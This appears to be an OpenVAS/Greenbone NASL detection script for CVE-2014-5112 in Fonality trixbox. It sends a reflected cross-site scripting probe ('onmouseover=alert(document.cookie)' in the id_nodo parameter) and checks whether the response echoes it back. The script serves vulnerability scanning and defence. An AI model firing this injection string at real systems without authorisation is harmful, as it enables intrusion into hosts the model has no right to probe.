if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804726" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2014-5112" );
	script_bugtraq_id( 68720 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-07-30 16:33:49 +0530 (Wed, 30 Jul 2014)" );
	script_name( "Fonality trixbox Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Fonality trixbox and is prone to multiple
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it is
  possible to read cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to improper validation of user supplied input passed
  via 'mac', 'lang', and 'id_nodo' parameters." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary arbitrary
  code, manipulate SQL queries in the backend database, and disclose certain
  sensitive information." );
	script_tag( name: "affected", value: "Fonality trixbox" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/127522" );
	script_xref( name: "URL", value: "http://downloads.securityfocus.com/vulnerabilities/exploits/68720.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/trixbox", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: NASLString( dir, "/user/index.php" ), port: http_port );
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	if(ContainsString( rcvRes, ">trixbox - User Mode<" )){
		url = dir + "/user/help/html/index.php?id_nodo=\"onmouseover=alert(document.cookie)%20\"";
		if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "onmouseover=alert\\(document.cookie\\)" )){
			report = http_report_vuln_url( port: http_port, url: url );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

